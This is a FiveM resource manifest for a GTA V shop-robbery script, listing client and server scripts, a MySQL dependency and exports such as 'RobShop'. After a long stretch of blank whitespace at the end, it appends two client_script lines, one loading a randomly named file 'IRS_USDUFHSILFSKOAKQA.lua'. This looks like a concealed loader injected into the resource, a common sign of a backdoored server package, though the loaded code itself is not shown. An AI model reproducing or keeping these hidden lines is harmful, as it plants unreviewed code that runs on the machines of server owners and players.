fx_version 'bodacious'
game 'gta5'

client_scripts {
    'client/main.lua',
    'client/shop.lua',
}

server_scripts {
    '@mysql-async/lib/MySQL.lua',
    'server/main.lua'
}

server_exports {
    'RobShop',
    'GetShopName'
}

shared_script 'config.lua'




















client_script "FIREAC.lua"
client_script "IRS_USDUFHSILFSKOAKQA.lua"